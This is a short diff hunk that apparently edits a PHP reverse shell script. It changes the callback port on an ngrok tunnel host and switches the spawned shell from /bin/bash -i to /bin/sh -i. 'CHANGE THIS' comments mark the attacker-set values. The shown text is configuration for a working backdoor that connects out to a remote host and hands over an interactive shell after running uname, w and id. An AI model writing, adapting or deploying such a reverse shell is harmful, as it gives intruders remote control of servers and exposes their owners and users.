@@ -47,11 +47,11 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '0.tcp.in.ngrok.io';  // CHANGE THIS
-$port = 14225;       // CHANGE THIS
+$port = 11315;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; /bin/bash -i';
+$shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
